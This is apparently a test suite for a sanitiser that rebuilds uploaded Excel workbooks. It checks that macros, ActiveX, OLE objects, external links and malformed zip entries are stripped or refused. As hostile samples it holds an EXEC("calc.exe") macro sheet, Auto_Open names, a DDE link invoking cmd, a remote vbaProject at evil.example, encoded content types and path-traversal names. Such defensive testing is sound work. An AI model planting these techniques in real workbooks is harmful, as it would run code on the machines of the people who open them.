"""
The package rebuild every uploaded workbook goes through (core.ooxml.clean): one regression test or more per
finding of the independent review of the .xlsm work (F1 to F8), for the handover pack's reader, for a plain .xlsx
and for quote levelling's importer, which share it.

Workbooks are built by handoverpack.sample_select (invented names and figures) and then tampered with the way the
review's reproductions did.
"""
import io
import re
import time
import zipfile
from functools import lru_cache

import openpyxl
from defusedxml.ElementTree import fromstring
from django.core.files.uploadedfile import SimpleUploadedFile
from django.test import SimpleTestCase

from core import ooxml
from handoverpack import engine, mapping, reader, sample_select
from levelling import importer

M = mapping.get('supplier-select')
VBA = b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1' + b'FAKEVBA' * 100
SHEET = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet'


@lru_cache(maxsize=None)
def plain():
    return sample_select.build(sample_select.DEMO)


@lru_cache(maxsize=None)
def xlsm():
    return sample_select.with_macros(plain())


def parts(data):
    with zipfile.ZipFile(io.BytesIO(data)) as z:
        return {i.filename: z.read(i) for i in z.infolist()}


def rebuild(data, edit=None, extra=(), duplicate=None):
    files = parts(data)
    if edit:
        files = edit(files)
    out = io.BytesIO()
    import warnings
    with warnings.catch_warnings():
        warnings.simplefilter('ignore')  # zipfile warns about a duplicate name: that is the point
        with zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED) as z:
            for name, raw in files.items():
                z.writestr(name, raw)
            for name, raw in extra:
                z.writestr(name, raw)
    return out.getvalue()


def add(files, name, raw, ctype=None, rel=None, source='xl/_rels/workbook.xml.rels', target=None, rid='rIdX9'):
    files[name] = raw
    if ctype:
        files['[Content_Types].xml'] = files['[Content_Types].xml'].replace(
            b'</Types>', b'<Override PartName="/' + name.encode() + b'" ContentType="' + ctype + b'"/></Types>')
    if rel:
        files[source] = files[source].replace(
            b'</Relationships>', b'<Relationship Id="' + rid.encode() + b'" Type="' + rel + b'" Target="'
            + (target or name.removeprefix('xl/')).encode() + b'"/></Relationships>')
    return files


def types(data):
    root = fromstring(parts(data)['[Content_Types].xml'])
    return {(e.get('PartName') or e.get('Extension')): e.get('ContentType') for e in root}


def all_rels(data):
    out = []
    for name, raw in parts(data).items():
        if name.endswith('.rels'):
            out += [(name, r.get('Type'), r.get('Target'), r.get('TargetMode')) for r in fromstring(raw)]
    return out


def levelling_read(data, name='bill.xlsx'):
    return importer.read(SimpleUploadedFile(name, data))


class Assertions(SimpleTestCase):
    def assertNoActiveContent(self, clean):
        names = [n.lower() for n in parts(clean)]
        self.assertFalse([n for n in names if re.search(r'vba|activex|ctrlprop|embeddings|externallink|connections|'
                                                        r'customui|macrosheet|payload', n)], names)
        for part, ctype in types(clean).items():
            self.assertFalse(re.search(r'macroenabled|vbaproject|activex|controlproperties|oleobject|externallink|'
                                       r'connections|macrosheet', ctype.lower()), (part, ctype))
        for name, rtype, target, mode in all_rels(clean):
            self.assertFalse(re.search(r'vbaproject|activex|ctrlprop|/control$|oleobject|externallink|connections|'
                                       r'macrosheet', rtype.lower()), (name, rtype))
            if mode:
                self.assertTrue(rtype.lower().endswith('/hyperlink'), (name, rtype))
        reader.open_book(clean, engine.extents(M))  # reads
        self.assertEqual(ooxml.clean(clean)[1], 0)  # and has nothing left to remove


class EncodedTypesTests(Assertions):
    """F1: types written with character references (&#118;baProject) and a VBA part under another name."""

    def disguised(self, base):
        def e(f):
            f['[Content_Types].xml'] = f['[Content_Types].xml'].replace(
                b'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml',
                b'application/vnd.ms-excel.sheet.&#109;acroEnabled.main+xml')
            return add(f, 'xl/payload.bin', VBA, b'application/vnd.ms-office.&#118;baProject',
                       b'http://schemas.microsoft.com/office/2006/relationships/&#118;baProject')
        return rebuild(base, e)

    def test_xlsm_xlsx_and_levelling_all_lose_it(self):
        data = self.disguised(plain())
        for ext in ('.xlsm', '.xlsx'):
            with self.subTest(ext):
                clean, removed = reader.prepare(data, ext)
                self.assertEqual(removed, 2)  # the VBA part, and the comment's VML drawing
                self.assertNoActiveContent(clean)
                self.assertEqual(types(clean)['/xl/workbook.xml'],
                                 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml')
        self.assertNotIn(b'FAKEVBA', b''.join(parts(importer._check_zip(data)).values()))

    def test_renamed_activex_with_encoded_types(self):
        """The review's repro 9: ActiveX moved to xl/embeddings, every type written with character references."""
        def e(f):
            ren = {'xl/activeX/activeX1.xml': 'xl/embeddings/ax1.xml', 'xl/activeX/activeX1.bin': 'xl/embeddings/ax1.bin',
                   'xl/activeX/_rels/activeX1.xml.rels': 'xl/embeddings/_rels/ax1.xml.rels'}
            f = {ren.get(k, k): v for k, v in f.items()}
            f['[Content_Types].xml'] = f['[Content_Types].xml'].replace(
                b'/xl/activeX/activeX1.xml" ContentType="application/vnd.ms-office.activeX+xml',
                b'/xl/embeddings/ax1.xml" ContentType="application/vnd.ms-office.&#97;ctiveX+xml').replace(
                b'/xl/activeX/activeX1.bin" ContentType="application/vnd.ms-office.activeX"',
                b'/xl/embeddings/ax1.bin" ContentType="application/vnd.ms-office.&#97;ctiveX"')
            f['xl/worksheets/sheet5.xml'] = f['xl/worksheets/sheet5.xml'].replace(
                b'<controls>', b'<s-1:controls xmlns:s-1="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
            ).replace(b'</controls>', b'</s-1:controls>')
            f['xl/worksheets/_rels/sheet5.xml.rels'] = f['xl/worksheets/_rels/sheet5.xml.rels'].replace(
                b'relationships/control" Target="../activeX/activeX1.xml"',
                b'relationships/&#99;ontrol" Target="../embeddings/ax1.xml"')
            return f
        clean, _ = reader.strip_macros(rebuild(xlsm(), e))
        self.assertNoActiveContent(clean)
        self.assertNotIn(b'controls', parts(clean)['xl/worksheets/sheet5.xml'])


class MacroSheetTests(SimpleTestCase):
    """F2 and F3: Excel 4 macro sheets, however they are dressed up, and auto-run names are refused, not stripped."""
    XLM = (b'<?xml version="1.0" encoding="UTF-8"?><xm:macrosheet xmlns:xm="http://schemas.microsoft.com/office/excel/'
           b'2006/main" xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row r="1"><c r="A1">'
           b'<f>EXEC("calc.exe")</f></c></row></sheetData></xm:macrosheet>')

    def refused(self, data, kind):
        for call in (lambda: reader.prepare(data, '.xlsm'), lambda: reader.prepare(data, '.xlsx'),
                     lambda: reader.open_book(data, engine.extents(M))):
            with self.assertRaises(reader.WorkbookRefused):
                call()
        with self.assertRaises(importer.WorkbookRefused):
            levelling_read(data)
        with self.assertRaises(ooxml.Refused) as e:
            ooxml.clean(data)
        self.assertEqual(e.exception.kind, kind)

    def test_by_relationship_type_under_a_worksheet_name(self):
        self.refused(rebuild(plain(), lambda f: add(
            f, 'xl/worksheets/sheetM.xml', self.XLM, b'application/vnd.openxmlformats-officedocument.spreadsheetml.'
            b'worksheet+xml', b'http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet')), 'macrosheet')

    def test_by_content_type_even_unreferenced(self):
        for ctype in (b'application/vnd.ms-excel.macrosheet+xml', b'application/vnd.ms-excel.intlmacrosheet+xml',
                      b'application/vnd.openxmlformats-officedocument.spreadsheetml.dialogsheet+xml'):
            with self.subTest(ctype):
                self.refused(rebuild(plain(), lambda f: add(f, 'xl/sheetM.xml', self.XLM, ctype)), 'macrosheet')

    def test_dialog_and_international_macro_sheet_relationships(self):
        for rel in (b'http://schemas.microsoft.com/office/2006/relationships/xlIntlMacrosheet',
                    b'http://schemas.openxmlformats.org/officeDocument/2006/relationships/dialogsheet'):
            with self.subTest(rel):
                self.refused(rebuild(plain(), lambda f: add(
                    f, 'xl/worksheets/sheetM.xml', self.XLM, b'application/vnd.openxmlformats-officedocument.'
                    b'spreadsheetml.worksheet+xml', rel)), 'macrosheet')

    def test_auto_open_names(self):
        for name in (b'_xlnm.Auto_Open', b'Auto_Open', b'_xlnm.Auto_Close', b'auto_activate'):
            def e(f, name=name):
                w = f['xl/workbook.xml']
                tag = b'<definedName name="' + name + b'">Sheet1!$A$1</definedName>'
                if b'<definedNames>' in w:
                    w = w.replace(b'<definedNames>', b'<definedNames>' + tag)
                else:
                    w = w.replace(b'</sheets>', b'</sheets><definedNames>' + tag + b'</definedNames>')
                f['xl/workbook.xml'] = w
                return f
            with self.subTest(name):
                self.refused(rebuild(plain(), e), 'autorun')


class ZipLayoutTests(SimpleTestCase):
    """F4: duplicate entries and paths that leave the package."""

    def test_duplicate_names_ignoring_case(self):
        p = parts(xlsm())
        for extra in (('[Content_Types].xml', p['[Content_Types].xml']), ('XL/workbook.xml', p['xl/workbook.xml'])):
            with self.subTest(extra[0]):
                data = rebuild(xlsm(), extra=[extra])
                with self.assertRaises(reader.WorkbookRefused):
                    reader.prepare(data, '.xlsm')
                with self.assertRaises(importer.WorkbookRefused):
                    levelling_read(data)

    def test_paths_that_escape_or_are_absolute(self):
        for name in ('../evil.xml', '/xl/evil.xml', 'xl/../../evil.xml', 'C:/evil.xml', 'xl\\evil.xml'):
            with self.subTest(name):
                with self.assertRaises(ooxml.Refused):
                    ooxml.clean(rebuild(plain(), extra=[(name, b'<x/>')]))

    def test_rewritten_with_fresh_entries(self):
        clean, _ = reader.strip_macros(xlsm())
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            for i in z.infolist():
                self.assertEqual((i.date_time, i.compress_type, i.extra, i.comment),
                                 ((1980, 1, 1, 0, 0, 0), zipfile.ZIP_DEFLATED, b'', b''))


class RelationshipTests(Assertions):
    """F5 and F6: external relationships, OLE, external links (DDE), connections and the references to them."""
    R = b'http://schemas.openxmlformats.org/officeDocument/2006/relationships/'

    def test_external_relationships_are_dropped_by_type_first(self):
        def e(f):
            rels = f['xl/worksheets/_rels/sheet5.xml.rels']
            rels = rels.replace(b'</Relationships>', (
                b'<Relationship Id="rIdE1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" '
                b'Target="http://evil.example/v.bin" TargetMode="External"/>'
                b'<Relationship Id="rIdE2" Type="' + self.R + b'oleObject" Target="file:///c:/x.bin" '
                b'TargetMode="External"/>'
                b'<Relationship Id="rIdE3" Type="' + self.R + b'hyperlink" Target="https://example.com/spec" '
                b'TargetMode="External"/></Relationships>'))
            f['xl/worksheets/_rels/sheet5.xml.rels'] = rels
            return f
        clean, _ = reader.strip_macros(rebuild(xlsm(), e))
        self.assertNoActiveContent(clean)
        kept = [r for r in all_rels(clean) if r[3]]
        self.assertEqual([(r[1].rsplit('/', 1)[1], r[2]) for r in kept], [('hyperlink', 'https://example.com/spec')])

    def test_ole_external_links_and_connections_go_with_their_references(self):
        def e(f):
            f = add(f, 'xl/embeddings/oleObject1.bin', VBA, b'application/vnd.openxmlformats-officedocument.oleObject',
                    self.R + b'oleObject', 'xl/worksheets/_rels/sheet5.xml.rels', '../embeddings/oleObject1.bin',
                    'rIdOle')
            f = add(f, 'xl/connections.xml', b'<?xml version="1.0"?><connections xmlns="http://schemas.openxmlformats'
                    b'.org/spreadsheetml/2006/main"><connection id="1" name="q" type="4" refreshOnLoad="1"><webPr '
                    b'url="http://evil.example/x"/></connection></connections>',
                    b'application/vnd.openxmlformats-officedocument.spreadsheetml.connections+xml',
                    self.R + b'connections', rid='rIdCn')
            f = add(f, 'xl/externalLinks/externalLink1.xml', b'<?xml version="1.0"?><externalLink xmlns="http://'
                    b'schemas.openxmlformats.org/spreadsheetml/2006/main"><ddeLink ddeService="cmd" ddeTopic="/c calc"/>'
                    b'</externalLink>', b'application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml',
                    self.R + b'externalLink', rid='rIdXl')
            f['xl/workbook.xml'] = f['xl/workbook.xml'].replace(
                b'</sheets>', b'</sheets><externalReferences><externalReference r:id="rIdXl"/></externalReferences>')
            f['xl/worksheets/sheet5.xml'] = f['xl/worksheets/sheet5.xml'].replace(
                b'</worksheet>', b'<oleObjects><oleObject progId="Package" shapeId="1030" r:id="rIdOle"/></oleObjects>'
                b'<webPublishItems count="1"><webPublishItem id="1" divId="d" sourceType="sheet" destinationFile="'
                b'http://evil.example/p.htm"/></webPublishItems></worksheet>')
            return f
        clean, _ = reader.strip_macros(rebuild(xlsm(), e))
        self.assertNoActiveContent(clean)
        p = parts(clean)
        self.assertNotIn(b'externalReference', p['xl/workbook.xml'])
        for word in (b'oleObject', b'webPublishItem', b'controls'):
            self.assertNotIn(word, p['xl/worksheets/sheet5.xml'])

    def test_unknown_relationship_types_and_mismatched_parts_are_refused(self):
        unknown = rebuild(plain(), lambda f: add(f, 'xl/thing.xml', b'<x/>', b'application/xml',
                                                 b'http://example.com/relationships/thing'))
        mismatch = rebuild(plain(), lambda f: add(f, 'xl/worksheets/sheetV.xml', VBA,
                                                  b'application/vnd.ms-office.vbaProject', SHEET.encode()))
        for data in (unknown, mismatch):
            with self.assertRaises(ooxml.Refused) as e:
                ooxml.clean(data)
            self.assertEqual(e.exception.kind, 'unknown')

    def test_an_unreferenced_part_is_not_kept(self):
        clean, removed = reader.prepare(rebuild(plain(), extra=[('xl/stray.bin', VBA)]), '.xlsx')
        self.assertEqual(removed, 2)  # the stray part, and the comment's VML drawing
        self.assertNotIn('xl/stray.bin', parts(clean))


class LinearTimeTests(SimpleTestCase):
    """F7: nothing is matched with a backtracking pattern, so crafted repetition costs linear time."""

    def test_unclosed_and_repeated_controls(self):
        junk_open = b''.join(b'<controls>%d' % i for i in range(20000))
        junk_closed = b'<controls/>' * 20000
        for label, junk in (('unclosed', junk_open), ('closed', junk_closed)):
            data = rebuild(xlsm(), lambda f, junk=junk: {**f, 'xl/worksheets/sheet1.xml': f[
                'xl/worksheets/sheet1.xml'].replace(b'</worksheet>', junk + b'</worksheet>')})
            t = time.monotonic()
            try:
                clean, _ = reader.strip_macros(data)
                self.assertNotIn(b'controls', parts(clean)['xl/worksheets/sheet1.xml'])
            except reader.WorkbookRefused:
                pass  # not well-formed: refused, quickly
            with self.subTest(label):
                self.assertLess(time.monotonic() - t, 5)

    def test_element_count_is_capped(self):
        data = rebuild(plain(), lambda f: {**f, 'xl/workbook.xml': f['xl/workbook.xml'].replace(
            b'</workbook>', b'<x/>' * (ooxml.MAX_ELEMENTS + 1) + b'</workbook>')})
        with self.assertRaises(ooxml.Refused):
            ooxml.clean(data)


class FormControlTests(SimpleTestCase):
    """F8: a realistic form control (VML check box with its macro, the control in the sheet, ActiveX) comes out
    cleanly: the comment beside it survives (its VML box doesn't) and the stored copy opens and saves in openpyxl
    without complaint."""

    def test_legacy_vml_goes_whole_and_the_comment_stays(self):
        """Review 2, item 8: VML is dropped entirely, the comment box with it; the comment's text is kept."""
        before = parts(xlsm())
        vml_name = next(n for n in before if n.endswith('.vml'))
        self.assertIn(b'ObjectType="Checkbox"', before[vml_name])
        clean, _ = reader.strip_macros(xlsm())
        p = parts(clean)
        self.assertFalse([n for n in p if n.endswith('.vml')])
        self.assertNotIn(b'legacyDrawing', p['xl/worksheets/sheet5.xml'])
        self.assertNotIn(b'FmlaMacro', b''.join(p.values()))
        import warnings
        with warnings.catch_warnings(record=True) as w:
            warnings.simplefilter('always')
            wb = openpyxl.load_workbook(io.BytesIO(clean))
            wb.save(io.BytesIO())
        self.assertEqual([str(x.message) for x in w], [])
        self.assertEqual(wb.worksheets[4]['A2'].comment.text, 'Checked against the quotes')

    def test_drawing_form_controls_and_macro_buttons(self):
        xml = (b'<xdr:wsDr xmlns:xdr="http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing" xmlns:a="'
               b'http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:mc="http://schemas.openxmlformats.org/'
               b'markup-compatibility/2006"><mc:AlternateContent><mc:Choice Requires="a14"><xdr:twoCellAnchor>'
               b'<xdr:sp macro=""><xdr:nvSpPr><xdr:cNvPr id="2" name="Check Box 1"><a:extLst><a:ext uri="x">'
               b'<a14:compatExt xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" spid="_x0000_s1"/>'
               b'</a:ext></a:extLst></xdr:cNvPr></xdr:nvSpPr></xdr:sp><xdr:clientData/></xdr:twoCellAnchor>'
               b'</mc:Choice></mc:AlternateContent><xdr:twoCellAnchor><xdr:sp macro="[0]!NewSheet"><xdr:nvSpPr>'
               b'<xdr:cNvPr id="3" name="Button"/></xdr:nvSpPr></xdr:sp><xdr:clientData/></xdr:twoCellAnchor>'
               b'</xdr:wsDr>')
        root = ooxml.parse(xml)
        self.assertTrue(ooxml._drawing(root, set()))
        out = ooxml.serialise(root)
        self.assertNotIn(b'compatExt', out)
        self.assertNotIn(b'AlternateContent', out)
        self.assertIn(b'macro=""', out)
        self.assertNotIn(b'NewSheet', out)
        self.assertIn(b'name="Button"', out)


class LevellingTests(SimpleTestCase):
    """Quote levelling's uploads get the same rebuild: a VBA project inside an .xlsx is removed before reading."""

    def test_vba_inside_an_xlsx_is_removed_and_the_lines_read(self):
        from levelling.tests.test_import import HEAD, xlsx
        f = xlsx([HEAD, ['J1', 'Desk', 1, 'nr']])
        data = rebuild(f.read(), lambda files: add(files, 'xl/vbaProject.bin', VBA, b'application/vnd.ms-office.'
                                                   b'vbaProject', b'http://schemas.microsoft.com/office/2006/'
                                                   b'relationships/vbaProject'))
        rows = levelling_read(data)
        self.assertEqual([r.ref for r in rows[0]], ['J1'])
        self.assertNotIn('xl/vbaProject.bin', parts(importer._check_zip(data)))
